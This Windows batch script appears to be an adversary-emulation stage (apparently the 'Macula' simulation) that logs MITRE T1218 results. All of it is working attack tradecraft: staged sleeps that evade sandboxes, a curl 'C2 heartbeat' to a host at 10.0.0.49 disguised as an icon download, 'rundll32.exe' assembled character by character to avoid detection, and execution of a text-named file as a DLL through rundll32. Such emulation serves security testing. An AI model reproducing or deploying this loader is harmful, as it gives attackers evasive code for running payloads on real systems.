@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\8498\f252d4ca
SET fpakbq=Macula-Stage0-8498
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8498-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=project.txt
SET fpldhe=8498

REM Log file path using random variable
SET krtyj=%APPDATA%\!yydue!\macula-simulations.log

REM Initial delay - 45 seconds using timeout
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_start=45s>> "!krtyj!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_complete=success>> "!krtyj!" 2>nul

REM C2 Heartbeat - using plain curl as required
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: c2_heartbeat_start=initiated>> "!krtyj!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: c2_heartbeat_complete=!ERRORLEVEL!>> "!krtyj!" 2>nul

REM Delay - 12 seconds using ping
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=12s_ping>> "!krtyj!" 2>nul
ping -n 12 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_complete=success>> "!krtyj!" 2>nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: directory_change_start=!yktnwwf!>> "!krtyj!" 2>nul
cd /d "!yktnwwf!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: directory_change_result=!ERRORLEVEL!>> "!krtyj!" 2>nul

REM Delay - 8 seconds using CHOICE
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=8s_choice>> "!krtyj!" 2>nul
CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_complete=success>> "!krtyj!" 2>nul

REM Build obfuscated rundll32.exe character by character
SET mzqax=r
SET wvplt=u
SET bnjtk=n
SET pghrs=d
SET qwvnx=l
SET xckjy=l
SET tmdhf=3
SET zlbnp=2
SET fqmwk=.
SET vhstc=e
SET rjzgy=x
SET lbqkt=e

SET rundll=!mzqax!!wvplt!!bnjtk!!pghrs!!qwvnx!!xckjy!!tmdhf!!zlbnp!!fqmwk!!vhstc!!rjzgy!!lbqkt!

REM Build full path to system32
SET fsysc=%windir%
SET ghtpr=\system32\
SET fullpath=!fsysc!!ghtpr!!rundll!

REM Random delay between 10-29 seconds
SET /A random_delay=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: random_delay_start=!random_delay!s>> "!krtyj!" 2>nul
timeout /t !random_delay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: random_delay_complete=success>> "!krtyj!" 2>nul

REM Execute DLL with obfuscated command
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_execution_start=!edjwtl!>> "!krtyj!" 2>nul

REM Build command with obfuscated arguments
SET dllarg=Dll
SET entrypt=Main

REM Execute the T1218 technique
!fullpath! !edjwtl!,!dllarg!!entrypt!

REM Capture result
IF !ERRORLEVEL! EQU 0 (
    SET result=1
    SET err_detail=
) ELSE (
    SET result=0
    SET err_detail=exit_code_!ERRORLEVEL!
)

REM Format timestamp for TTP logging
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET datetime=%%I
SET ttp_date=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2!
SET ttp_time=!datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!

REM Log TTP execution
echo [!ttp_date! !ttp_time!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!result!:!err_detail!>> "!krtyj!" 2>nul

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_execution_result=!ERRORLEVEL!>> "!krtyj!" 2>nul

REM Final delay - 10 seconds
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: final_delay_start=10s>> "!krtyj!" 2>nul
timeout /t 10 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: simulation_complete=success>> "!krtyj!" 2>nul

ENDLOCAL